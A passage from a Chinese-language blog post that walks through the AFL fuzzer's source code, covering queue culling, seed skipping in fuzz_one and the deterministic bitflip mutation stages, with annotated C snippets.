class="title">q</span>;</span></span><br><span class="line">  <span class="type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  score_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  queued_favored = <span class="number">0</span>;</span><br><span class="line">  pending_favored = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure><p>首先清空每个queue实体的favored</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (q)</span><br><span class="line">&#123;</span><br><span class="line">  q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">  q = q-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmep_v数组用来标识没有遍历到的区域，以下循环将所有存在不同分支的种子筛选出来，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">   <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>))))</span><br><span class="line">   &#123;</span><br><span class="line"><span class="comment">// 判断favored种子遍历的区域，是否已经在之前筛选出了（将对应的temp_v置为0了）</span></span><br><span class="line">     u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Remove all bits belonging to the current entry from temp_v. */</span></span><br><span class="line">  <span class="comment">// 然后将所有当前种子遍历过的区域从temp_v中去除</span></span><br><span class="line">     <span class="keyword">while</span> (j--)</span><br><span class="line">       <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">         temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line"></span><br><span class="line">     top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">     <span class="comment">// 然后增加其favored值</span></span><br><span class="line">     queued_favored++;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed)</span><br><span class="line">       pending_favored++;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">q = <span class="built_in">queue</span>;</span><br><span class="line"><span class="comment">// 对于不favored的，通过创建redundant文件的方式表明此种子是多余的</span></span><br><span class="line"><span class="keyword">while</span> (q)</span><br><span class="line">&#123;</span><br><span class="line">  mark_as_redundant(q, !q-&gt;favored);</span><br><span class="line">  q = q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fuzz-one-种子的变异">fuzz_one | 种子的变异</h2><p>此函数用于从queue中选取一个种子，对种子进行变异，返回0说明运行成功，否则运行失败</p><p>首先进行了一些细节的处理, 包括:</p><ol><li>首先判断是否要跳过当前testcase给favored的testcase更多运行机会<ul><li>如果存在 <code>pending_favored</code> ， 并且当前queue已经运行过或者不favored，那么为了将时间留给pending_favored的testcase, 有99%的几率直接跳过当前种子</li><li>如果无<code>pending_favored</code>， 对于不是favored的testcase, 如果已经fuzz过, 95%概率跳过, 如果没有fuzz过, 75%概率跳过</li><li>如果是favored， 不跳过</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 <span class="title function_">fuzz_one</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  s32 len, fd, temp_len, i, j;</span><br><span class="line">  u8 *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = <span class="number">0</span>;</span><br><span class="line">  u64 havoc_queued, orig_hit_cnt, new_hit_cnt;</span><br><span class="line">  u32 splice_cycle = <span class="number">0</span>, perf_score = <span class="number">100</span>, orig_perf, prev_cksum, eff_cnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  u8 ret_val = <span class="number">1</span>, doing_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8 a_collect[MAX_AUTO_EXTRA];</span><br><span class="line">  u32 a_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IGNORE_FINDS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In IGNORE_FINDS mode, skip any entries that weren&#x27;t in the</span></span><br><span class="line"><span class="comment">     initial data set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;depth &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pending_favored)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span></span><br><span class="line"><span class="comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span></span><br><span class="line"><span class="comment">       cases. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        UR(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span></span><br><span class="line"><span class="comment">       The odds of skipping stuff are higher for already-fuzzed inputs and</span></span><br><span class="line"><span class="comment">       lower for never-fuzzed entries. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (UR(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB)</span><br><span class="line">      <span class="comment">// random(0, 100) &lt; 75 ; 75%</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (UR(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB)</span><br><span class="line">      <span class="comment">// random(0, 100) &lt; 95 ; 95%</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 判断需要跳过的情形</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^IGNORE_FINDS */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty)</span><br><span class="line">  &#123;</span><br><span class="line">    ACTF(<span class="string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,</span><br><span class="line">         current_entry, queued_paths, unique_crashes);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Map the test case into memory. */</span></span><br><span class="line">  <span class="comment">// 将testcase映射进内存</span></span><br><span class="line">  fd = open(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every</span></span><br><span class="line"><span class="comment">     single byte anyway, so it wouldn&#x27;t give us any performance or memory usage</span></span><br><span class="line"><span class="comment">     benefits. */</span></span><br><span class="line"></span><br><span class="line">  out_buf = ck_alloc_nozero(len);</span><br><span class="line"></span><br><span class="line">  subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  cur_depth = queue_cur-&gt;depth;</span><br></pre></td></tr></table></figure><p>如果之前cal_failed， 那么要再运行一次 <code>calibrate_case</code> 来校准testcase</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (queue_cur-&gt;cal_failed)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u8 res = FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Reset exec_cksum to tell calibrate_case to re-execute the testcase</span></span><br><span class="line"><span class="comment">       avoiding the usage of an invalid trace_bits.</span></span><br><span class="line"><span class="comment">       For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon || res != crash_mode)</span><br><span class="line">  &#123;</span><br><span class="line">    cur_skipped_paths++;</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来通过<code>trim_case</code>  来修剪并运行testcase</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u8 res = trim_case(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">    FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon)</span><br><span class="line">  &#123;</span><br><span class="line">    cur_skipped_paths++;</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">  queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len != queue_cur-&gt;len)</span><br><span class="line">    len = queue_cur-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br></pre></td></tr></table></figure><p>通过calculate_score 计算分数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orig_perf = perf_score = calculate_score(queue_cur);</span><br></pre></td></tr></table></figure><p>接下来进入真正的变异阶段</p><h3 id="确定性变异">确定性变异</h3><p>首先判断是否需要跳过确定性(deterministic)变异阶段，这部分变异没有随机性，是所有种子都要经历的阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">  <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">   for this master instance. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">doing_det = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>deterministic 阶段分为以下几个部分：</p><h4 id="bitflip">bitflip</h4><p>bitflip阶段是对于testcase的bit位进行翻转</p><p><strong>bitflip 1/1</strong></p><p>通过每次翻转一个bit，来检查是否具有类似于 “ELF” 此类魔数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> stage_short = <span class="string">&quot;flip1&quot;</span>;</span><br><span class="line"> stage_max = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line"> stage_name = <span class="string">&quot;bitflip 1/1&quot;</span>;</span><br><span class="line"></span><br><span class="line"> stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line"> orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"> </span><br><span class="line"> prev_cksum = queue_cur-&gt;exec_cksum;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">   stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">   FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"><span class="comment">// 每次翻转一个 bit</span></span><br><span class="line">   <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">   <span class="comment">// 运行一次fuzz测试</span></span><br><span class="line">     <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">   FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"><span class="comment">// 翻转回来</span></span><br><span class="line">   <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>)</span><br><span class="line">   &#123;</span><br><span class="line"><span class="comment">// 根据经验，通常检查最低位的翻转最有效率</span></span><br><span class="line">     u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">  <span class="comment">// 获取cksum</span></span><br><span class="line">     <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum)</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">          final character and force output. */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA)</span><br><span class="line">         a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">       a_len++;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">         maybe_add_auto(a_collect, a_len);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum)</span><br><span class="line">     &#123;</span><br><span class="line">  <span class="comment">// 如果cksum不等于prev_cksum，可能是一个魔数的开始或者结束</span></span><br><span class="line">       <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">          worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">         maybe_add_auto(a_collect, a_len);</span><br><span class="line"><span class="comment">// 如果是一个魔数的结束</span></span><br><span class="line"><span class="comment">// 那么调用 may_add_auto收集起来</span></span><br><span class="line">       a_len = <span class="number">0</span>;</span><br><span class="line">       prev_cksum = cksum;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Continue collecting string, but only if the bit flip actually made</span></span><br><span class="line"><span class="comment">        any difference - we don&#x27;t want no-op tokens. */</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">// 需要cksum不等于原来才需要增加a_len并记录</span></span><br><span class="line">       <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA)</span><br><span class="line">         a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">       a_len++;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>bitflip 2/1</strong></p><p>每次翻转两个bit，运行并保留有价值的种子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">stage_name = <span class="string">&quot;bitflip 2/1&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip2&quot;</span>;</span><br><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 翻转两个bit</span></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP2] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP2] += stage_max;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>bitflip 4/1</strong></p><p>每次翻转4个bit，运行并保留有价值的种子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">stage_name = <span class="string">&quot;bitflip 4/1&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip4&quot;</span>;</span><br><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP4] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP4] += stage_max;</span><br></pre></td></tr></table></figure><p><strong>bitflip 8/8</strong></p><p>每次反转一整个byte，并记录那些即使全部翻转也对执行路径没有影响的byte，避免在之后花费时间去测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 